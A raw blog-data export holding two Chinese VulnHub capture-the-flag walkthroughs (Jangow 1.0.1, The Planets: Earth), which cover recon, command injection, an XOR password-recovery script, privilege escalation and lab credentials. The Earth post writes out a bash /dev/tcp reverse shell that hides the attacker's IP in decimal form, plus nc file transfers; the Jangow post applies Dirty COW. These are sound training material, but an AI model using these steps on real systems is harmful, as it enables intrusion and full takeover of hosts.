alt=\"1\"><br>打开网页发现里面有一个站点目录，打开后貌似是一个静态页面站点，在查看<code>robots.txt</code>文件无果后使用<code>dirb</code>工具进行目录遍历。<br><img src=\"https://img.freeaes.com/images/2021/12/05/2.png\" alt=\"2\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/3.png\" alt=\"3\"><br>在遍历目录的过程中我尝试了一下有没有匿名登录，但是貌似并不行。<br><img src=\"https://img.freeaes.com/images/2021/12/05/4.png\" alt=\"4\"><br>目录遍历并没有发现什么有用的信息，其中有一个wordpress目录，但是页面好像损坏了<br><img src=\"https://img.freeaes.com/images/2021/12/05/5.png\" alt=\"5\"><br>那就只能在首页看看哪里能点点哪里了，其他都是一些描点或外部超链接，在尝试到<code>Buscar</code>的时候我发现它是一个php文件，URL地址栏中有显示需要传参，并且页面是空白的，怀疑是文件包含之类的漏洞.<br><img src=\"https://img.freeaes.com/images/2021/12/05/6.png\" alt=\"6\"><br>经过测试发现是一个命令执行漏洞，输入<code>whoami</code>有回显信息。<br><img src=\"https://img.freeaes.com/images/2021/12/05/7.png\" alt=\"7\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>我本来是想直接反弹一个shell，但是尝试了几种方法都不行，然后我通过python在攻击机本地建立了一个简单的web服务，然后在目标靶机使用<code>curl</code>命令访问我的网站，但是连接超时，在我的终端里也没有显示有访问请求，判断目标应该是设立了防火墙规则禁止出站流量，所以也就意味着只能在网站内执行命令<br><img src=\"https://img.freeaes.com/images/2021/12/05/8.png\" alt=\"8\"><br>在查看文件的时候,我发现在上级目录下有一个隐藏文件,貌似是备份文件，打开是一个连接数据库的文件，但是目标也没开启3306，不过用户名是靶机名字，也许可以试试能不能登陆系统<br><img src=\"https://img.freeaes.com/images/2021/12/05/9.png\" alt=\"9\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/10.png\" alt=\"10\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>登陆机器，在当前用户家目录下发现一个<code>user.txt</code>文件，解密后是一个空密码，暂时还不知道有什么用，因为是普通用户，没有权限进入root目录，考虑提权，SUID提权试了一下不成功，但是<code>uname -a</code>看一下内核,内核版本是ubuntu4.4.0-31,可以使用脏牛本地提权.<br><img src=\"https://img.freeaes.com/images/2021/12/05/11.png\" alt=\"11\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/10.png\" alt=\"12\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/10.png\" alt=\"13\"><br>Dirty Cow适用于内核版本&gt;=2.6.22的Linux，并且低于以下版本。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Debian 7          3.2.82-1</span><br><span class=\"line\"></span><br><span class=\"line\">Debian 8          3.16.36-1+deb8u2</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 14.04      3.13.0-100.147</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 16.04      4.4.0-45.66</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 16.10      4.8.0-26.28</span><br><span class=\"line\"></span><br><span class=\"line\">Cetnos6/RHEL6     2.6.32-642.6.2.el6</span><br><span class=\"line\"></span><br><span class=\"line\">Centos7 /RHEL7    3.10.0-327.36.3.el7</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因为目标有防火墙限制，所以只能通过ftp上传payload，在攻击机下载并编译好payload，用<code>jangow01/abygurl69</code>登录ftp上传到家目录。<br><img src=\"https://img.freeaes.com/images/2021/12/05/14.png\" alt=\"14\"><br><code>chmod +x cowroot</code>给cowroot添加执行权限，然后直接运行。执行完后查看权限是root。<br><img src=\"https://img.freeaes.com/images/2021/12/05/15.png\" alt=\"14\"><br>最后去root目录下，有一个<code>proof.txt</code>文件，应该就是这个靶机的Flag了。<br><img src=\"https://img.freeaes.com/images/2021/12/05/16.png\" alt=\"16\"></p>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<h1 id=\"Jangow-1-0-1\"><a href=\"#Jangow-1-0-1\" class=\"headerlink\" title=\"Jangow 1.0.1\"></a>Jangow 1.0.1</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/jangow-101,754/\">http://www.vulnhub.com/entry/jangow-101,754/</a><br>难度：Easy</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Parrot 192.168.56.104<br>目标靶机：Ubuntu 192.168.56.118</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>开启目标靶机，登陆界面有其IP地址，不用自己手动扫描。但是还是要用nmap扫一下开启了什么端口。<code>sudo nmap -sS -n -p- 192.168.56.118</code>，然后使用<code>-sV</code>参数查看开放端口的详细信息。<br><img src=\"https://img.freeaes.com/images/2021/12/05/0.png\" alt=\"0\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/1.png\" alt=\"1\"><br>打开网页发现里面有一个站点目录，打开后貌似是一个静态页面站点，在查看<code>robots.txt</code>文件无果后使用<code>dirb</code>工具进行目录遍历。<br><img src=\"https://img.freeaes.com/images/2021/12/05/2.png\" alt=\"2\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/3.png\" alt=\"3\"><br>在遍历目录的过程中我尝试了一下有没有匿名登录，但是貌似并不行。<br><img src=\"https://img.freeaes.com/images/2021/12/05/4.png\" alt=\"4\"><br>目录遍历并没有发现什么有用的信息，其中有一个wordpress目录，但是页面好像损坏了<br><img src=\"https://img.freeaes.com/images/2021/12/05/5.png\" alt=\"5\"><br>那就只能在首页看看哪里能点点哪里了，其他都是一些描点或外部超链接，在尝试到<code>Buscar</code>的时候我发现它是一个php文件，URL地址栏中有显示需要传参，并且页面是空白的，怀疑是文件包含之类的漏洞.<br><img src=\"https://img.freeaes.com/images/2021/12/05/6.png\" alt=\"6\"><br>经过测试发现是一个命令执行漏洞，输入<code>whoami</code>有回显信息。<br><img src=\"https://img.freeaes.com/images/2021/12/05/7.png\" alt=\"7\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>我本来是想直接反弹一个shell，但是尝试了几种方法都不行，然后我通过python在攻击机本地建立了一个简单的web服务，然后在目标靶机使用<code>curl</code>命令访问我的网站，但是连接超时，在我的终端里也没有显示有访问请求，判断目标应该是设立了防火墙规则禁止出站流量，所以也就意味着只能在网站内执行命令<br><img src=\"https://img.freeaes.com/images/2021/12/05/8.png\" alt=\"8\"><br>在查看文件的时候,我发现在上级目录下有一个隐藏文件,貌似是备份文件，打开是一个连接数据库的文件，但是目标也没开启3306，不过用户名是靶机名字，也许可以试试能不能登陆系统<br><img src=\"https://img.freeaes.com/images/2021/12/05/9.png\" alt=\"9\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/10.png\" alt=\"10\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>登陆机器，在当前用户家目录下发现一个<code>user.txt</code>文件，解密后是一个空密码，暂时还不知道有什么用，因为是普通用户，没有权限进入root目录，考虑提权，SUID提权试了一下不成功，但是<code>uname -a</code>看一下内核,内核版本是ubuntu4.4.0-31,可以使用脏牛本地提权.<br><img src=\"https://img.freeaes.com/images/2021/12/05/11.png\" alt=\"11\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/10.png\" alt=\"12\"><br><img src=\"https://img.freeaes.com/images/2021/12/05/10.png\" alt=\"13\"><br>Dirty Cow适用于内核版本&gt;=2.6.22的Linux，并且低于以下版本。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Debian 7          3.2.82-1</span><br><span class=\"line\"></span><br><span class=\"line\">Debian 8          3.16.36-1+deb8u2</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 14.04      3.13.0-100.147</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 16.04      4.4.0-45.66</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 16.10      4.8.0-26.28</span><br><span class=\"line\"></span><br><span class=\"line\">Cetnos6/RHEL6     2.6.32-642.6.2.el6</span><br><span class=\"line\"></span><br><span class=\"line\">Centos7 /RHEL7    3.10.0-327.36.3.el7</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因为目标有防火墙限制，所以只能通过ftp上传payload，在攻击机下载并编译好payload，用<code>jangow01/abygurl69</code>登录ftp上传到家目录。<br><img src=\"https://img.freeaes.com/images/2021/12/05/14.png\" alt=\"14\"><br><code>chmod +x cowroot</code>给cowroot添加执行权限，然后直接运行。执行完后查看权限是root。<br><img src=\"https://img.freeaes.com/images/2021/12/05/15.png\" alt=\"14\"><br>最后去root目录下，有一个<code>proof.txt</code>文件，应该就是这个靶机的Flag了。<br><img src=\"https://img.freeaes.com/images/2021/12/05/16.png\" alt=\"16\"></p>\n"},{"title":"VulnHub | The Planets-Earth","date":"2021-12-10T02:24:29.000Z","cover":"https://img.freeaes.com/images/2021/09/05/6.jpg","_content":"# The Planets: Earth\n\n\n## 项目地址\n[http://www.vulnhub.com/entry/the-planets-earth,755/](http://www.vulnhub.com/entry/the-planets-earth,755/)\n\n难度：Easy\n\n## 测试环境\n攻击机：Kali 192.168.56.111\n\n目标靶机：Fedora 192.168.56.110\n\n## 信息收集\n打开目标靶机，使用`arp-scan -I eth1 -l`指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用`-sV`参数查看开放端口的详细信息，这里扫描出目标开启了`22,80,443`端口。\n\n![1](https://img.freeaes.com/images/2021/12/10/Planets-Earth-1.png)\n\n![2](https://img.freeaes.com/images/2021/12/10/Planets-Earth-2.png)\n\n![3](https://img.freeaes.com/images/2021/12/10/Planets-Earth-3.png)\n\n访问网页，80和443端口都显示`400`访问错误，查看证书发现`earth.local`域名。\n\n![4](https://img.freeaes.com/images/2021/12/10/Planets-Earth-4.png)\n\n![5](https://img.freeaes.com/images/2021/12/10/Planets-Earth-5.png)\n\n使用ssl-scan工具收集证书信息`sslscan --show-certificate -4 192.168.56.110`，扫描完后发现总共有`earth.local`和`terratest.earth.local`两个域名，将其加入`/etc/hosts`文件中\n\n![6](https://img.freeaes.com/images/2021/12/10/Planets-Earth-6.png)\n\n![7](https://img.freeaes.com/images/2021/12/10/Planets-Earth-7.png)\n\n再次访问显示连接正常，使用dirb工具遍历目录，我四个网址都扫描了一次，因为怕靶机配置虚拟主机，前三个扫描到有个admin后台登陆页面，尝试万能密码不行，而且源码中也没有隐藏信息提示。在扫描`https://terratest.earth.local/`的时候发现该网站下有`robots.txt`文件\n\n![8]https://img.freeaes.com/images/2021/12/10/Planets-Earth-8.png\n\n访问发现其有一个特殊文件`testingnotes.*`，我一开始以为是个网页脚本语言文件，测试了好几种都不成功，后来发现是个txt文件（后来看别的大佬写的wp也可以写个py脚本，就不用一个一个手动测试了）。使用谷歌翻译了一下，大概意思就是说使用`XOR`（异或运算）算法加密传输的信息（也就是主页下的那些原始码）。`testdata.txt`是加密用的密钥（这个文件内容就是个介绍地球的文本，所以密钥应该就是它本身），`terra`是管理员账户（用于登录刚刚找到的admin登录页面）。\n\n![9](https://img.freeaes.com/images/2021/12/10/Planets-Earth-9.png)\n\n![10](https://img.freeaes.com/images/2021/12/10/Planets-Earth-10.png)\n\n写个小脚本解密，先将密钥转化成hex，然后和密文进行xor运算，最后将得到的结果转为str得到原文，因为原文有很多重复的，只需要截取一段就行了`earthclimatechangebad4humans`\n\n``` python\nimport binascii\n\ndef str_to_hexStr(string):\n    str_bin = string.encode('utf-8')\n    return binascii.hexlify(str_bin).decode('utf-8')\n    \ndata = \"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a\"\n\nkey=\"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\"\n\nstr_bin = key.encode('utf-8')\naa=binascii.hexlify(str_bin).decode('utf-8')\nbb=hex(int(data,16) ^ int(aa,16))\nprint(bytes.fromhex(bb[2:]).decode('utf-8'))\n# 执行后得到earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat\n\n```\n\n使用账号密码`terra/earthclimatechangebad4humans`登录，得到一个命令执行页面\n\n![11](https://img.freeaes.com/images/2021/12/10/Planets-Earth-11.png)\n\n## 漏洞利用\n在网页敲命令终究不太爽，还是要反弹shell。but过，在反弹shell的时候提示禁止远程连接，但是测试了一下发现连自己本机都不能连接，所以应该不是防火墙限制，只是过滤了IP而已，不过Linux有个很好的地方，就是可以用完整的十进制来表示IP，随便找个IP转十进制的网站转一转\n\n![12](https://img.freeaes.com/images/2021/12/10/Planets-Earth-12.png)\n\n![13](https://img.freeaes.com/images/2021/12/10/Planets-Earth-13.png)\n\n先在攻击机开一个监听端口等靶机反弹`nc -lvvp`，然后再使用命令执行漏洞执行`bash -i >& /dev/tcp/3232249967/8848 0>&1`命令反弹到本地，在earth_web目录下找到一个flag`user_flag.txt`\n\n![14](https://img.freeaes.com/images/2021/12/10/Planets-Earth-14.png)\n\n![15](https://img.freeaes.com/images/2021/12/10/Planets-Earth-15.png)\n\n## 权限提升\n在逛了一圈var路径下的文件后要么找不到有什么有用的信息，要么权限不够，考虑一下提权。先搜索一下系统内有suid权限的文件`find / -perm -04000 2>/dev/null`。其中有个不寻常的文件`reset_root`，直接运行会报错，提示触发器不存在\n\n![16](https://img.freeaes.com/images/2021/12/10/Planets-Earth-16.png)\n\n分析一下，先将文件传到kali上，现在kali机上执行`nc -lvnp 8888 > reset_root`监听8888端口用于接收文件，然后在靶机上执行`nc -w 3 192.168.56.111 8888 < /usr/bin/reset_root`将文件传到kali。\n\n![17](https://img.freeaes.com/images/2021/12/10/Planets-Earth-17.png)\n\n在kali上使用`strace`命令跟踪reset_root，`-f`和`-F`表示同时跟踪fork和vfork出来的进程，可以看到，它在输出完第一段话后开始尝试访问图中这三个文件，但是提示文件不存在\n\n![18](https://img.freeaes.com/images/2021/12/10/Planets-Earth-18.png)\n\n所以我们可以在目标机器上尝试创建文件，刚好两个目录下也有写入权限，新建三个文件，然后再次尝试执行`reset_root`，没有报错并且提示root用户密码已经重置为Earth，使用`su`命令切换到root用户，可以正常登录，在root目录下找到第二个flag`root_flag.txt`\n\n![19](https://img.freeaes.com/images/2021/12/10/Planets-Earth-19.png)\n\n","source":"_posts/2021-12-10.md","raw":"---\ntitle: VulnHub | The Planets-Earth \ndate: 2021-12-10 10:24:29\ncover: https://img.freeaes.com/images/2021/09/05/6.jpg\ntags:\n- VulnHub\ncategories: 学习笔记\n---\n# The Planets: Earth\n\n\n## 项目地址\n[http://www.vulnhub.com/entry/the-planets-earth,755/](http://www.vulnhub.com/entry/the-planets-earth,755/)\n\n难度：Easy\n\n## 测试环境\n攻击机：Kali 192.168.56.111\n\n目标靶机：Fedora 192.168.56.110\n\n## 信息收集\n打开目标靶机，使用`arp-scan -I eth1 -l`指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用`-sV`参数查看开放端口的详细信息，这里扫描出目标开启了`22,80,443`端口。\n\n![1](https://img.freeaes.com/images/2021/12/10/Planets-Earth-1.png)\n\n![2](https://img.freeaes.com/images/2021/12/10/Planets-Earth-2.png)\n\n![3](https://img.freeaes.com/images/2021/12/10/Planets-Earth-3.png)\n\n访问网页，80和443端口都显示`400`访问错误，查看证书发现`earth.local`域名。\n\n![4](https://img.freeaes.com/images/2021/12/10/Planets-Earth-4.png)\n\n![5](https://img.freeaes.com/images/2021/12/10/Planets-Earth-5.png)\n\n使用ssl-scan工具收集证书信息`sslscan --show-certificate -4 192.168.56.110`，扫描完后发现总共有`earth.local`和`terratest.earth.local`两个域名，将其加入`/etc/hosts`文件中\n\n![6](https://img.freeaes.com/images/2021/12/10/Planets-Earth-6.png)\n\n![7](https://img.freeaes.com/images/2021/12/10/Planets-Earth-7.png)\n\n再次访问显示连接正常，使用dirb工具遍历目录，我四个网址都扫描了一次，因为怕靶机配置虚拟主机，前三个扫描到有个admin后台登陆页面，尝试万能密码不行，而且源码中也没有隐藏信息提示。在扫描`https://terratest.earth.local/`的时候发现该网站下有`robots.txt`文件\n\n![8]https://img.freeaes.com/images/2021/12/10/Planets-Earth-8.png\n\n访问发现其有一个特殊文件`testingnotes.*`，我一开始以为是个网页脚本语言文件，测试了好几种都不成功，后来发现是个txt文件（后来看别的大佬写的wp也可以写个py脚本，就不用一个一个手动测试了）。使用谷歌翻译了一下，大概意思就是说使用`XOR`（异或运算）算法加密传输的信息（也就是主页下的那些原始码）。`testdata.txt`是加密用的密钥（这个文件内容就是个介绍地球的文本，所以密钥应该就是它本身），`terra`是管理员账户（用于登录刚刚找到的admin登录页面）。\n\n![9](https://img.freeaes.com/images/2021/12/10/Planets-Earth-9.png)\n\n![10](https://img.freeaes.com/images/2021/12/10/Planets-Earth-10.png)\n\n写个小脚本解密，先将密钥转化成hex，然后和密文进行xor运算，最后将得到的结果转为str得到原文，因为原文有很多重复的，只需要截取一段就行了`earthclimatechangebad4humans`\n\n``` python\nimport binascii\n\ndef str_to_hexStr(string):\n    str_bin = string.encode('utf-8')\n    return binascii.hexlify(str_bin).decode('utf-8')\n    \ndata = \"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a\"\n\nkey=\"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\"\n\nstr_bin = key.encode('utf-8')\naa=binascii.hexlify(str_bin).decode('utf-8')\nbb=hex(int(data,16) ^ int(aa,16))\nprint(bytes.fromhex(bb[2:]).decode('utf-8'))\n# 执行后得到earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat\n\n```\n\n使用账号密码`terra/earthclimatechangebad4humans`登录，得到一个命令执行页面\n\n![11](https://img.freeaes.com/images/2021/12/10/Planets-Earth-11.png)\n\n## 漏洞利用\n在网页敲命令终究不太爽，还是要反弹shell。but过，在反弹shell的时候提示禁止远程连接，但是测试了一下发现连自己本机都不能连接，所以应该不是防火墙限制，只是过滤了IP而已，不过Linux有个很好的地方，就是可以用完整的十进制来表示IP，随便找个IP转十进制的网站转一转\n\n![12](https://img.freeaes.com/images/2021/12/10/Planets-Earth-12.png)\n\n![13](https://img.freeaes.com/images/2021/12/10/Planets-Earth-13.png)\n\n先在攻击机开一个监听端口等靶机反弹`nc -lvvp`，然后再使用命令执行漏洞执行`bash -i >& /dev/tcp/3232249967/8848 0>&1`命令反弹到本地，在earth_web目录下找到一个flag`user_flag.txt`\n\n![14](https://img.freeaes.com/images/2021/12/10/Planets-Earth-14.png)\n\n![15](https://img.freeaes.com/images/2021/12/10/Planets-Earth-15.png)\n\n## 权限提升\n在逛了一圈var路径下的文件后要么找不到有什么有用的信息，要么权限不够，考虑一下提权。先搜索一下系统内有suid权限的文件`find / -perm -04000 2>/dev/null`。其中有个不寻常的文件`reset_root`，直接运行会报错，提示触发器不存在\n\n![16](https://img.freeaes.com/images/2021/12/10/Planets-Earth-16.png)\n\n分析一下，先将文件传到kali上，现在kali机上执行`nc -lvnp 8888 > reset_root`监听8888端口用于接收文件，然后在靶机上执行`nc -w 3 192.168.56.111 8888 < /usr/bin/reset_root`将文件传到kali。\n\n![17](https://img.freeaes.com/images/2021/12/10/Planets-Earth-17.png)\n\n在kali上使用`strace`命令跟踪reset_root，`-f`和`-F`表示同时跟踪fork和vfork出来的进程，可以看到，它在输出完第一段话后开始尝试访问图中这三个文件，但是提示文件不存在\n\n![18](https://img.freeaes.com/images/2021/12/10/Planets-Earth-18.png)\n\n所以我们可以在目标机器上尝试创建文件，刚好两个目录下也有写入权限，新建三个文件，然后再次尝试执行`reset_root`，没有报错并且提示root用户密码已经重置为Earth，使用`su`命令切换到root用户，可以正常登录，在root目录下找到第二个flag`root_flag.txt`\n\n![19](https://img.freeaes.com/images/2021/12/10/Planets-Earth-19.png)\n\n","slug":"2021-12-10","published":1,"updated":"2022-01-13T08:04:37.542Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsviia000puxf7enf08ooe","content":"<h1 id=\"The-Planets-Earth\"><a href=\"#The-Planets-Earth\" class=\"headerlink\" title=\"The Planets: Earth\"></a>The Planets: Earth</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/the-planets-earth,755/\">http://www.vulnhub.com/entry/the-planets-earth,755/</a></p>\n<p>难度：Easy</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Kali 192.168.56.111</p>\n<p>目标靶机：Fedora 192.168.56.110</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>打开目标靶机，使用<code>arp-scan -I eth1 -l</code>指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用<code>-sV</code>参数查看开放端口的详细信息，这里扫描出目标开启了<code>22,80,443</code>端口。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-1.png\" alt=\"1\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-2.png\" alt=\"2\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-3.png\" alt=\"3\"></p>\n<p>访问网页，80和443端口都显示<code>400</code>访问错误，查看证书发现<code>earth.local</code>域名。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-4.png\" alt=\"4\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-5.png\" alt=\"5\"></p>\n<p>使用ssl-scan工具收集证书信息<code>sslscan --show-certificate -4 192.168.56.110</code>，扫描完后发现总共有<code>earth.local</code>和<code>terratest.earth.local</code>两个域名，将其加入<code>/etc/hosts</code>文件中</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-6.png\" alt=\"6\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-7.png\" alt=\"7\"></p>\n<p>再次访问显示连接正常，使用dirb工具遍历目录，我四个网址都扫描了一次，因为怕靶机配置虚拟主机，前三个扫描到有个admin后台登陆页面，尝试万能密码不行，而且源码中也没有隐藏信息提示。在扫描<code>https://terratest.earth.local/</code>的时候发现该网站下有<code>robots.txt</code>文件</p>\n<p>![8]<a href=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-8.png\">https://img.freeaes.com/images/2021/12/10/Planets-Earth-8.png</a></p>\n<p>访问发现其有一个特殊文件<code>testingnotes.*</code>，我一开始以为是个网页脚本语言文件，测试了好几种都不成功，后来发现是个txt文件（后来看别的大佬写的wp也可以写个py脚本，就不用一个一个手动测试了）。使用谷歌翻译了一下，大概意思就是说使用<code>XOR</code>（异或运算）算法加密传输的信息（也就是主页下的那些原始码）。<code>testdata.txt</code>是加密用的密钥（这个文件内容就是个介绍地球的文本，所以密钥应该就是它本身），<code>terra</code>是管理员账户（用于登录刚刚找到的admin登录页面）。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-9.png\" alt=\"9\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-10.png\" alt=\"10\"></p>\n<p>写个小脚本解密，先将密钥转化成hex，然后和密文进行xor运算，最后将得到的结果转为str得到原文，因为原文有很多重复的，只需要截取一段就行了<code>earthclimatechangebad4humans</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str_to_hexStr</span>(<span class=\"params\">string</span>):</span></span><br><span class=\"line\">    str_bin = string.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> binascii.hexlify(str_bin).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">data = <span class=\"string\">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">key=<span class=\"string\">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str_bin = key.encode(<span 